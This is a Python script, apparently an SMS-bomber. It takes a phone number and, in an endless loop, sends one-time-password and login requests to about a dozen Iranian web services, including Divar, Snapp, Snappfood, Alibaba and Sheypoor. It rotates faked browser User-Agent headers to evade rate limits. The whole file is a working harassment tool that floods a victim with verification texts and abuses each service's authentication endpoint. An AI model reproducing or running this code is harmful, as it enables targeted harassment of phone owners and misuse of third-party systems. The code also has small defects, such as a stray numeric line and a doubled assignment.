import requests
import time
import random

number = input('enter you number (9xxxxxxxxxx) : ')


url_divar = 'https://api.divar.ir/v5/auth/authenticate'
json_divar ={"phone":"0"+number}	

url_express = 'https://api.divar.ir/v5/auth/authenticate'
json_express = {"phone": number}

url_azki = 'https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/'
json_azki = {"PhoneNumber": number}

url_deniz ='https://deniizshop.com/api/v1/users/update_mobile_phone_request'
json_deniz ={"mobile_phone": number}

url_snappfood = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=97fd0891-3f0d-4100-bbb5-aff181e185c8&locale=fa'
json_snappfood ={"cellphone":"0"+number}

url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = {"cellphone":"+98" + number}

url_bh = "https://bck.behtarino.com/api/v1/users/jwt_phone_verification"
json_bh ={"phone":"0"+number}

ulr_alibaba ="https://ws.alibaba.ir/api/v3/account/mobile/otp"
json=json_alibaba ={"phoneNumber":number}

url_tps = "https://tap33.me/api/v2/user"
json_tps = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}

url_shey = "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_shey = {"username":"0" + number}

url_clasino = "https://student.classino.com/otp/v1/api/login"
json_clasino = {'mobile':number}

url_thether = "https://abantether.com/users/login/"
json_tether ={"phoneNumber":number}


heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]

while True:
    random_head = random.choice(heads)
    8
    req = requests.post(url=url_azki,json=json_azki,headers=random_head)
    print('1',req)

    time.sleep(30)
    req1 = requests.post(url=url_bh,json=json_bh,headers=random_head)
    print('2',req1)

    req2 = requests.post(url=url_deniz,json=json_deniz,headers=random_head)
    print('3',req2)
    
    time.sleep(2)
    req3 = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print('4',req3)

    req4 = requests.post(url=url_express,json=json_express,headers=random_head)
    print('5',req4)

    req5 = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print('6',req5)

    time.sleep(2)
    req6 = requests.post(url=url_snappfood,json=json_snappfood,headers=random_head)
    print('7',req6)
    req6 = requests.post(url=ulr_alibaba,json=json_alibaba,headers=random_head)
    print(req6)
    req8 = requests.post(url=url_shey,json=json_shey,headers=random_head)
    print(req8)

    time.sleep(2)
    req9 = requests.post(url=url_clasino,json=json_clasino,headers=random_head)
    print(req9)
    req10 = requests.post(url=url_tps,json=json_tps,headers=random_head)
    print(req10)
    req11 = requests.post(url=url_thether,json=json_tether,headers=random_head)
    print('7',req11)
